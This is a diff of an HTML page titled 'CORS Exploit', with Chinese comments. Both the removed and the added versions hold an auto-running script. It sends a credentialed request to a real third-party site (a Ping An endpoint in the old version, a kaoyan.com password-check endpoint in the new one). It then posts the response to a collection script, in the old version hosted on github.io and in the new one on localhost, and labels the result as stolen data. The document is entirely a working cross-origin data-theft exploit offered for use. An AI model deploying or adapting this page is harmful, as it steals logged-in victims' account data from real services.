@@ -1,32 +1,58 @@
-<h1>CORS test</h1>
-<script>
-function loadXMLDoc() {
-    var xhr1;
-    var xhr2;
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit</title>
+</head>
+<body>
+    <h1>CORS漏洞利用</h1>
+    <div id="output"></div>
     
-    if (window.XMLHttpRequest) {
-        xhr1 = new XMLHttpRequest();
-        xhr2 = new XMLHttpRequest();
-    } else {
-        xhr1 = new ActiveXObject("Microsoft.XMLHTTP");
-        xhr2 = new ActiveXObject("Microsoft.XMLHTTP");
+    <script>
+    function exploit() {
+        var targetURL = 'https://i.kaoyan.com/set/password/check';
+        var attackerServer = 'http://localhost/save.php';
+        
+        var xhr = new XMLHttpRequest();
+        
+        xhr.open('GET', targetURL, true);
+        xhr.withCredentials = true; // 携带cookies
+        
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                var sensitiveData = xhr.responseText;
+                
+                // 显示获取的数据
+                document.getElementById('output').innerHTML = 
+                    '<h3>成功窃取的数据：</h3>' + 
+                    '<pre>' + sensitiveData + '</pre>';
+                
+                console.log('窃取的数据:', sensitiveData);
+                
+                // 发送到攻击者服务器
+                var xhr2 = new XMLHttpRequest();
+                xhr2.open('POST', attackerServer, true);
+                xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr2.send('T1=' + encodeURIComponent(sensitiveData));
+                
+                xhr2.onload = function() {
+                    alert('数据已成功保存到服务器！查看1.txt文件');
+                };
+                
+            } else {
+                document.getElementById('output').innerHTML = '请求失败: ' + xhr.status;
+            }
+        };
+        
+        xhr.onerror = function() {
+            document.getElementById('output').innerHTML = '请求错误';
+        };
+        
+        xhr.send();
+        document.getElementById('output').innerHTML = '正在发送请求...';
     }
     
-    xhr1.onreadystatechange = function() {
-        if (xhr1.readyState == 4 && xhr1.status == 200) {
-            var datas = xhr1.responseText;
-            xhr2.open("POST", "https://chunliunai.github.io/save.php", "true");
-            alert('3');
-            xhr2.setRequestHeader("Content-type", "application/x-www-form-urlencoded;charset=utf-8");
-            xhr2.send("T1=" + escape(datas));
-        }
-    }
-    
-    xhr1.open("GET", "https://rsb.pingan.com.cn/itam/mas/linden/ip/request", "true");
-    alert(xhr1.responseText);
-    xhr1.withCredentials = true;
-    xhr1.send();
-}
-
-loadXMLDoc();
-</script>
+    // 自动执行
+    exploit();
+    </script>
+</body>
+</html>
